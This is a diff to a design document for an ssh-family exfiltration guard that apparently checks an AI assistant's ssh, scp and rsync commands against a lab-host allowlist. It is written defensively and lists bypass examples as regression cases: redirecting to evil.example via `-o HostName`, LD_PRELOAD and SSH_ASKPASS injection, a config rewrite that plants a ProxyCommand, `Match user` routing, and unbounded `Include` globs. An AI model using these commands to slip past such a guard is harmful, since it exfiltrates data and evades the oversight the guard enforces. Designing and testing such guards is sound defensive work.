@@ -86,7 +86,12 @@ design doc. Concretely:
    with a sentinel proving no execution, a config that is present but
    unparseable (blocked, not literal fallback), a config the chain writes
    earlier on the same line (blocked), ProxyJump cycle/depth exhaustion
-   (blocked), and literal fallback only on resolution failure or an absent
+   (blocked), a user-qualified destination whose `Match user` route is
+   non-allowlisted (blocked), a loader/helper environment override
+   (`LD_PRELOAD`/`SSH_ASKPASS`, blocked), an over-broad `Include` exceeding the
+   scan's breadth caps (blocked), a resolution failure carrying a
+   host/config-selecting override (blocked), and literal fallback only on a
+   bare-destination resolution failure or an absent
    config chain — each for `ssh`, `scp` and `rsync`-over-ssh.
 3. **`docs/internals/exfiltration-guard.md`** — one or two sentences recording
    that ssh-family destinations are resolved through `ssh -G` before the allowlist
@@ -135,7 +140,8 @@ Behaviour, in order:
 1. **Refuse a config/binary-selecting command-scoped environment override
    (thread #2).** `_check_ssh_family` is now called with the command's captured
    leading `VAR=value` assignments (`env`, see "Command-scoped environment"
-   below). Before any resolution, if `env` assigns `HOME` or `PATH`, raise a
+   below). Before any resolution, if `env` assigns `HOME` or `PATH`, or any of
+   the process-altering loader/helper variables listed below, raise a
    block. `PATH` changes *which* `ssh` binary the shell runs, so running
    `ssh -G` under the hook's own `PATH` (or under an attacker-chosen `PATH`)
    would resolve through a different program than the real command — the latter
@@ -144,7 +150,15 @@ Behaviour, in order:
    `$HOME` — it builds the path from the passwd-database home directory and
    expands `~` the same way (step 3) — so a command-scoped `HOME=` does not in
    fact redirect ssh's config, but a non-standard build or a `~`-dependent code
-   path could, and refusing it costs nothing. Fail closed: refuse rather than
+   path could, and refusing it costs nothing. The same refusal covers the
+   loader and local-helper variables that alter the `ssh` *process* rather than
+   its arguments — `LD_PRELOAD`, `LD_LIBRARY_PATH`, `LD_AUDIT`,
+   `DYLD_INSERT_LIBRARIES`, `DYLD_LIBRARY_PATH`, `SSH_ASKPASS` and its enabling
+   `SSH_ASKPASS_REQUIRE`: each can inject code into the real `ssh`, or make it
+   spawn a local helper, while the resolver's `ssh -G` (run without them)
+   cannot reflect that difference, so the resolved host would not describe what
+   the real command does. Refuse the whole set; see the full list and its test
+   coverage under "Command-scoped environment". Fail closed: refuse rather than
    resolve. (This mirrors the existing refusal of rsync transport env.) The
    same refusal applies when `HOME` or `PATH` was **set earlier on the same
    command line** — assigned (`PATH=/tmp; ssh amd-halo`) or exported
@@ -204,7 +218,15 @@ Behaviour, in order:
    any `-F <file>` named on the command line, and every file reachable through
    their `Include` directives (follow includes — absolute paths and ones
    relative to `~/.ssh` or `/etc/ssh` alike — to a bounded depth, expanding
-   `~` and globs) — for any command-executing directive. **The per-user config
+   `~` and globs, and bounded in **breadth** as well as depth: the total number
+   of files included across the chain, the total bytes read, and the number of
+   paths a single `Include` glob may match are each capped by a named constant —
+   `_MAX_INCLUDE_FILES`, `_MAX_INCLUDE_BYTES` and `_MAX_INCLUDE_GLOB_MATCHES`,
+   alongside the depth cap — so an assistant-controlled `Include /**`, or a glob
+   over a very large tree, cannot make the scan enumerate and read an unbounded
+   number of files before `ssh -G` ever runs; exceeding any cap is content
+   uncertainty and **blocks**, per the second scan outcome below) — for any
+   command-executing directive. **The per-user config
    must be located exactly as OpenSSH locates it: from the passwd-database home
    directory (`pwd.getpwuid(os.getuid()).pw_dir`), not from `$HOME`, and `~`
    must expand to that same passwd home.** OpenSSH builds the default user
@@ -255,7 +277,9 @@ Behaviour, in order:
      that is present but unreadable, or readable but whose grammar the scanner
      cannot classify, or an `Include` that resolves to an existing file the
      scanner cannot follow (including an `Include` chain deeper than the
-     scanner's bounded follow depth, or an `Include`/`-F` path the scanner
+     scanner's bounded follow depth, a chain that exceeds the
+     `_MAX_INCLUDE_FILES`/`_MAX_INCLUDE_BYTES`/`_MAX_INCLUDE_GLOB_MATCHES`
+     breadth caps, or an `Include`/`-F` path the scanner
      cannot expand because it carries a `%`-token or `${ENV}` reference),
      *may* carry a `Match exec`/`ProxyCommand` the scan
      did not see; returning `[token]` would then allow an allowlisted-literal
@@ -280,16 +304,41 @@ Behaviour, in order:
    "at scan time" qualifier matters when an earlier command on the same line
    rewrites the config the real ssh then reads — see "Config-chain modification
    earlier on the line" below.
-4. **Run `ssh -G <forwarded-options> <alias-without-user@-or-:port>`** with a
-   short timeout and captured output, mirroring the `Git.run` error handling:
-   any `OSError`/`SubprocessError`/timeout, or a non-zero exit, returns
-   `[token]` (literal fallback). The subprocess runs with `cwd=ctx.command_cwd`,
+4. **Run `ssh -G <forwarded-options> <alias-with-user@-but-without-:port>`** with
+   a short timeout and captured output, mirroring the `Git.run` error handling.
+   **The remote user is preserved, not stripped.** SSH config matching keys on
+   the login user — a `Match user attacker` block can add a `ProxyJump` or
+   rewrite `HostName` — so `ssh -G` must resolve under the same user the real
+   command uses, or `ssh attacker@amd-halo-ci` would route through a `Match
+   user` hop that `ssh -G amd-halo-ci`, resolved as the default user, never
+   sees. The resolver therefore keeps a `user@` prefix on the destination it
+   hands to `ssh -G` (`ssh -G attacker@amd-halo-ci`) and forwards an explicit
+   `-l <user>` when the command carries one (`-o User=<value>` is already
+   forwarded by the non-rejected-`-o` rule). Only the `:port` suffix is stripped.
+   The subprocess runs with `cwd=ctx.command_cwd`,
    so `cd /tmp; ssh -F config amd-halo-ci` resolves `/tmp/config` — the file the
    real ssh reads and the file step 3 scanned — not a `config` next to the hook
    process. The forwarded options are exactly the set
-   pinned under "Faithful resolution" below (`-F` and the host/config-selecting
-   `-o` values); the routing and command-executing `-o` forms are already
-   refused before resolution, so they never reach this call.
+   pinned under "Faithful resolution" below (`-F`, a `-l` login name, and the
+   host/config-selecting `-o` values); the routing and command-executing `-o`
+   forms are already refused before resolution, so they never reach this call.
+
+   **A resolution failure blocks when the command carries a host/config-selecting
+   override.** `ssh -G` can fail to launch, time out, or exit non-zero; the
+   literal fallback (returning `[token]`) is safe *only* when the literal token
+   is itself what ssh would resolve. It is **not** safe when the command line
+   redirects the effective destination with `-F`, a `-l`/`user@`, or a
+   host-selecting `-o` (`HostName`, `Port`, `User`, `HostKeyAlias`,
+   `CanonicalizeHostname`, …): there, returning `[amd-halo]` for
+   `ssh -o HostName=evil.example amd-halo` would let `_require_lab` clear the
+   allowlisted literal while the real ssh connects to `evil.example` — the exact
+   hole the forwarding contract exists to close, reopened whenever an attacker
+   can force `ssh -G` to fail. So a launch-failure/timeout/non-zero exit
+   **blocks** when any host/config-selecting override is present on the command
+   line, and falls back to the literal match only for a bare destination with no
+   such override (`ssh amd-halo`), where the literal token is the effective
+   destination. (A zero-exit but malformed or incomplete answer already blocks —
+   step 5.)
 5. **Parse** the `key value` lines of the output (ssh prints keys lowercased,
    one per line) and **validate the schema strictly**. Read `hostname`,
    `proxyjump`, `proxycommand`. A successful `ssh -G` prints exactly one
@@ -329,7 +378,10 @@ Behaviour, in order:
    non-allowlisted jump. So a hop is resolved with `ssh -G <hop>` carrying only
    the options OpenSSH applies to the jump connection — the shared `-F`
    config-file selector (which governs the whole invocation) — and **none** of
-   the target's `-o` host-selecting values. The hop's `hostname` comes from its
+   the target's `-o` host-selecting values, nor the target's `-l`/`user@` login
+   (a hop carries its own `user@` from the `-J user@hop` spec or its own config,
+   not the target's, so a target `-l`/`user@` cannot steer a hop's `Match user`
+   route either). The hop's `hostname` comes from its
    own resolved config, and that resolved `hostname` is added to the returned
    list so `_require_lab` checks it. When the depth cap, the invocation cap, or
    a cycle is hit, **raise a block**: the hop could not be
@@ -384,7 +436,7 @@ reconstructed from the prose.
 
 | Condition | Outcome | Where |
 | --- | --- | --- |
-| `HOME`/`PATH` set or unset for the command — leading, earlier on the line, or via `source`/`.` (incl. `env -i`/`-u`, `unset HOME`/`PATH`) | **Block** | Step 1 |
+| `HOME`/`PATH`, or a loader/helper var (`LD_PRELOAD`, `LD_LIBRARY_PATH`, `LD_AUDIT`, `DYLD_INSERT_LIBRARIES`, `DYLD_LIBRARY_PATH`, `SSH_ASKPASS`, `SSH_ASKPASS_REQUIRE`), set or unset for the command — leading, earlier on the line, or via `source`/`.` (incl. `env -i`/`-u`, `unset`) | **Block** | Step 1 |
 | Command-executing `-o` (`ProxyCommand`/`ProxyJump`/`LocalCommand`/`PermitLocalCommand`/`KnownHostsCommand`), `scp -S`, rsync transport flags | **Block** (before resolution) | Faithful resolution |
 | Config-source `-o` key (`Include`) that adds an unscanned config file | **Block** (before resolution) | Faithful resolution |
 | Command-executing directive detected in a readable config | **Block** | Step 3 |
@@ -395,7 +447,8 @@ reconstructed from the prose.
 | Resolved `hostname` not allowlisted, resolved `proxycommand` ≠ `none`, or a resolved `proxyjump` hop not allowlisted | **Block** | Steps 6-7 |
 | ProxyJump depth cap, invocation cap, or cycle exhausted | **Block** | Step 7 |
 | `argv[0]` path-qualified, or the resolver's `ssh` absent / outside `SYSTEM_PREFIXES` | **Literal fallback** | Step 2 |
-| `ssh -G` fails — `OSError`/`SubprocessError`/timeout/non-zero exit | **Literal fallback** | Step 4 |
+| `ssh -G` fails (`OSError`/`SubprocessError`/timeout/non-zero exit) **and** the command carries a host/config-selecting override (`-F`, `-l`/`user@`, host-selecting `-o`) | **Block** | Step 4 |
+| `ssh -G` fails (`OSError`/`SubprocessError`/timeout/non-zero exit) for a bare destination with no host/config-selecting override | **Literal fallback** | Step 4 |
 | Config chain genuinely absent (no user/system config, no `-F`, `Include` glob matches nothing) | **Literal fallback** | Step 3 |
 | rsync daemon-mode (`host::module`) or `rsync://` destination (no ssh) | **Literal fallback** (never resolved) | Faithful resolution |
 
@@ -421,9 +474,20 @@ Decision: forward `env` into `_check_ssh_family`, and in resolver step 1 **refus
 choice: the guard does not try to reproduce an arbitrary overridden environment, and
 it never runs `ssh -G` under an attacker-chosen `PATH`/`HOME` (which would be exactly
 the command-execution path thread #3 closes). The refusal is symmetric with the
-existing rsync transport-env refusal in `_check_ssh_family`/the dispatcher. Other
-assignments (`LANG`, `TERM`, a `SendEnv`/`SetEnv`-style variable that only reaches
-the *remote*, …) do not affect local binary or config selection and are left alone.
+existing rsync transport-env refusal in `_check_ssh_family`/the dispatcher. The
+loader and local-helper variables that alter the `ssh` process itself —
+`LD_PRELOAD`, `LD_LIBRARY_PATH`, `LD_AUDIT`, `DYLD_INSERT_LIBRARIES`,
+`DYLD_LIBRARY_PATH`, `SSH_ASKPASS` and `SSH_ASKPASS_REQUIRE` — are refused on the
+same step-1 footing as `HOME`/`PATH`, in every form the gate covers (leading, set
+earlier on the line, through a `source`/`.`, and the `env -i`/`-u` wrapper
+markers): each can inject code into the real `ssh` or make it spawn a local
+helper — a change the resolver's `ssh -G`, run without those variables, cannot
+see — so an attacker could make the real command behave unlike the resolved host.
+Only genuinely inert assignments (`LANG`, `TERM`, a `SendEnv`/`SetEnv`-style
+variable that reaches only the *remote*, …) do not affect local binary, library
+or config selection and are left alone. Regression tests cover
+`LD_PRELOAD=/tmp/x.so ssh amd-halo` and `SSH_ASKPASS=/tmp/x ssh amd-halo`
+(blocked).
 `env -i` / `env -u PATH` / `env -u HOME` wrapper forms clear or unset those
 variables without an assignment, changing which binary or config applies just as an
 assignment would, so the dispatcher treats those `env` flag forms as overrides too
@@ -476,7 +540,13 @@ clear is an override in exactly the way an assignment is. Removing a name from t
 set is never required — keeping it is the fail-closed direction — so neither
 `unset` nor `export -n` ever *clears* a tracked name; they only ever add. When
 `HOME` or `PATH` is in that set at an ssh-family command, step 1 blocks, exactly
-as for a leading assignment. A substitution body, which is analysed after the
+as for a leading assignment. The same tracking and block apply to the
+loader/local-helper names listed under "Command-scoped environment"
+(`LD_PRELOAD`, `LD_LIBRARY_PATH`, `LD_AUDIT`, `DYLD_INSERT_LIBRARIES`,
+`DYLD_LIBRARY_PATH`, `SSH_ASKPASS`, `SSH_ASKPASS_REQUIRE`): a preceding
+assignment, export, `unset`/`export -n`, or `source`/`.` that touches one of
+them adds it to the set, and an ssh-family command after it blocks. A
+substitution body, which is analysed after the
 list, is analysed with the set treated as "unknown", i.e. as if both were set —
 the analogue of the existing `ctx.at(None)` rule for a line that changes
 directory.
@@ -561,6 +631,10 @@ those normalised pairs:
 **Forwarded to `ssh -G` (verbatim, both spellings):**
 
 - `-F <configfile>` — the config file selector. Forwarded as `-F <value>`.
+- `-l <user>` — the login name. Forwarded as `-l <value>`, and a `user@` prefix
+  on the destination is kept (step 4), because SSH config matching keys on the
+  login user through `Match user`; dropping it would let a `Match user` block add
+  a `ProxyJump` or rewrite `HostName` that resolution never sees.
 - Every `-o <key>=<value>` whose `<key>` is **not** in the rejected set below.
   This deliberately forwards *all* host/config-selecting keys — `HostName`,
   `Port`, `User`, `HostKeyAlias`, `CanonicalizeHostname`, `CanonicalDomains`, and
@@ -601,16 +675,20 @@ both spellings:**
   amd-halo` resolves the alias rather than rejecting it against the literal
   allowlist.
 
-The forwarded `-o`/`-F` set above applies to resolving the **primary**
+The forwarded `-o`/`-F`/`-l` set above applies to resolving the **primary**
 destination only. A `-J`/`ProxyJump` hop is resolved with the hop-specific
 option set of step 7 — the shared `-F` but **none** of the target's `-o`
-host-selecting values — because OpenSSH does not apply the target's `-o
+host-selecting values or its `-l`/`user@` login — because OpenSSH does not apply the target's `-o
 HostName=…` to the jump connection, and forwarding it would let a target
 override clear a non-allowlisted hop.
 
-Everything else on the command line (positional host, `-p`/`-l`/`-i`/… transport
-flags that do not select the config) is neither forwarded nor rejected — it does not
-affect which host `ssh -G` reports.
+The `-l <user>` login name **is** forwarded (together with a `user@` prefix on the
+destination): SSH config matching keys on the login user through `Match user`, so
+`-l`/`user@` select which config applies and dropping them would let a
+`Match user` hop route past the allowlist — see resolver step 4. Everything else
+on the command line (positional host, `-p`/`-i`/… transport flags that do not
+select the config) is neither forwarded nor rejected — it does not affect which
+host `ssh -G` reports.
 
 **The contract is per program, not per family (review follow-up).** Today
 `_check_ssh_family` parses every ssh-family program with the one ssh table
@@ -663,7 +741,8 @@ spellings of both a forwarded `-o` (`-o HostName=` and `-oHostName=`) and `-F`
 
 The resolver runs `ssh -G` only when the command itself runs the `ssh` found on
 `PATH` (a bare `ssh`/`scp`/`sftp`/`rsync`, never a path-qualified program), only
-when that ssh is a system binary, only when neither `HOME` nor `PATH` is changed
+when that ssh is a system binary, only when neither `HOME`/`PATH` nor any
+loader/local-helper variable (`LD_PRELOAD`, `SSH_ASKPASS`, …) is changed
 for the command (leading, set earlier on the line, or through a `source`/`.`),
 and in the command's own working directory — reading the per-user config from the
 passwd home exactly as `ssh -G` does — so it reads the same `~/.ssh/config`,
@@ -759,12 +838,22 @@ A reviewer confirms the task is done when:
   regression test for the forwarding contract in "Faithful resolution".) The
   **attached** spelling `ssh -oHostName=evil.example amd-halo` is blocked the same
   way, and `-F file` / `-Ffile` both reach `ssh -G` as the config selector.
+- The remote user is preserved through resolution: `ssh attacker@amd-halo-ci`,
+  where a `Match user attacker` block in the config adds a `ProxyJump` to (or
+  rewrites `HostName` to) a non-allowlisted host, is **blocked** — the `user@`
+  prefix (and an explicit `-l attacker`) is forwarded to `ssh -G`, so the guard
+  resolves under the same login user the real command uses, rather than
+  resolving `amd-halo-ci` as the default user and clearing it. The same
+  destination without the `Match user` route resolves and is allowed/blocked on
+  the resolved host as usual.
 - Each command-executing `-o` form is **rejected before resolution**:
   `-o ProxyCommand=…`, `-o ProxyJump=…`, `-o LocalCommand=…`,
   `-o PermitLocalCommand=yes`, and the newly-added `-o KnownHostsCommand=…`, in both
   the separate and attached spellings and case-insensitively.
-- A command-scoped environment override that selects the config or binary is
-  **blocked**: `HOME=/tmp/evil ssh amd-halo` and `PATH=/tmp ssh amd-halo` are both
+- A command-scoped environment override that selects the config or binary, or
+  that alters the `ssh` process, is **blocked**: `HOME=/tmp/evil ssh amd-halo`,
+  `PATH=/tmp ssh amd-halo`, and a loader/helper override such as
+  `LD_PRELOAD=/tmp/x.so ssh amd-halo` or `SSH_ASKPASS=/tmp/x ssh amd-halo` are all
   refused, while a harmless assignment (`LANG=C ssh amd-halo`) is unaffected.
 - A config that can execute a command during resolution causes the resolver to
   **not run `ssh -G`** and to **block** (not merely fall back): a `Match exec` (or
@@ -785,6 +874,12 @@ A reviewer confirms the task is done when:
   **blocks** (`ssh amd-halo` with `Include %d/.ssh/extra` in `~/.ssh/config`,
   blocked, no `ssh -G` run) — it must not be read as an absent-glob literal
   fallback.
+- The config scan is bounded in breadth, not only depth: a config whose
+  `Include` chain exceeds `_MAX_INCLUDE_FILES`, `_MAX_INCLUDE_BYTES`, or a
+  single glob's `_MAX_INCLUDE_GLOB_MATCHES` (for example an assistant-written
+  `Include /**` or a glob over a large tree) **blocks** as content uncertainty
+  rather than reading an unbounded number of files — the fail-closed scan is
+  bounded in practice, not only in recursion depth.
 - A write to the reachable config chain earlier on the same line **blocks** the
   ssh-family command: `printf 'ProxyCommand touch /tmp/pwned\n' > ~/.ssh/config;
   ssh amd-halo` is refused and no sentinel is created, because the pre-execution
@@ -817,10 +912,17 @@ A reviewer confirms the task is done when:
   and a visited set, makes a bounded number of `ssh -G` calls, and **blocks** on
   exhaustion (the unresolved hop is never cleared by a literal match, even when the
   unresolved hop token is itself allowlisted).
-- When `ssh -G` fails (fake ssh exits non-zero, or ssh is absent), the guard falls
+- When `ssh -G` fails (fake ssh exits non-zero, or ssh is absent) for a **bare**
+  destination with no host/config-selecting override, the guard falls
   back to a literal match: an allowlisted literal (`ssh amd-halo`) is still
   allowed and a non-allowlisted literal (`ssh evil.example`) is still blocked —
-  i.e. identical to today's behaviour.
+  i.e. identical to today's behaviour. But when `ssh -G` fails for a command that
+  carries a host/config-selecting override, the guard **blocks** rather than
+  falling back: `ssh -o HostName=evil.example amd-halo` with a failing `ssh -G`
+  is refused (it is not cleared by the allowlisted literal `amd-halo`), because
+  the literal is provably not the effective destination the override names — the
+  same for a failing resolution of a `-F`-selected or `user@`/`-l`-qualified
+  destination.
 - `HOME`/`PATH` set earlier on the line reaches the step-1 refusal in every form:
   `export HOME=/tmp/evil; ssh amd-halo` and `export PATH=/tmp; ssh amd-halo`
   (exported), `PATH=/tmp; ssh amd-halo` and `HOME=/tmp/evil; ssh amd-halo`
@@ -1030,6 +1132,39 @@ same way:
     `8a5be352-003a-4c2c-955d-5e913f4ca625` (bare name) and
     `dfed2140-25dc-4290-b718-b41d0561236b` (path-qualified); whether to fold a
     fail-closed fix into this change is left to the approver (Open questions).
+
+A fifth review round (Copilot, PR #1133 HEAD) raised four more points, settled the
+same way (its fifth open thread — the concurrent-writer race — stays as Open
+question #6, a deliberate approver trade-off rather than a defect):
+
+19. **Bound the config scan in breadth, not only depth.** Settled in resolver
+    step 3: the scan caps total included files, total bytes read, and a single
+    `Include` glob's matches with named constants
+    (`_MAX_INCLUDE_FILES`/`_MAX_INCLUDE_BYTES`/`_MAX_INCLUDE_GLOB_MATCHES`),
+    alongside the depth cap, and exceeding any cap is content uncertainty that
+    **blocks** — so an assistant-controlled `Include /**` cannot make the
+    fail-closed scan read an unbounded set of files before `ssh -G`.
+20. **Block a resolution failure that carries a host/config-selecting override.**
+    Settled in resolver step 4: the literal fallback on a launch-failure/
+    timeout/non-zero `ssh -G` exit is reserved for a bare destination; when the
+    command carries `-F`, `-l`/`user@`, or a host-selecting `-o`, a failure
+    **blocks**, because the literal token is provably not the effective
+    destination the override names (returning it would reopen the
+    `-o HostName=evil.example` hole whenever `ssh -G` can be forced to fail).
+21. **Preserve the remote user in resolution.** Settled in resolver step 4 and
+    "Faithful resolution": `Match user` can add a `ProxyJump` or rewrite
+    `HostName`, so the resolver keeps the `user@` prefix and forwards `-l <user>`
+    (`-o User=` is already forwarded), resolving under the same login user the
+    real command uses rather than the default user. A user-qualified regression
+    case covers it.
+22. **Refuse loader/local-helper environment variables.** Settled in resolver
+    step 1 and "Command-scoped environment": `LD_PRELOAD`, `LD_LIBRARY_PATH`,
+    `LD_AUDIT`, `DYLD_INSERT_LIBRARIES`, `DYLD_LIBRARY_PATH`, `SSH_ASKPASS` and
+    `SSH_ASKPASS_REQUIRE` alter the `ssh` process itself (code injection or a
+    local-helper spawn) and are refused on the same step-1 footing as
+    `HOME`/`PATH`, in every form the gate covers, with regression coverage.
+    Genuinely inert variables (`LANG`, `TERM`, remote-only `SendEnv`/`SetEnv`)
+    are still left alone, keeping the "no new vector" claim honest.
 
 Separately, a verified dependency (not an open question): **`verify-exfiltration-guard.sh`
 base-branch comparison.** The verifier's `GUARD_FILES` list includes
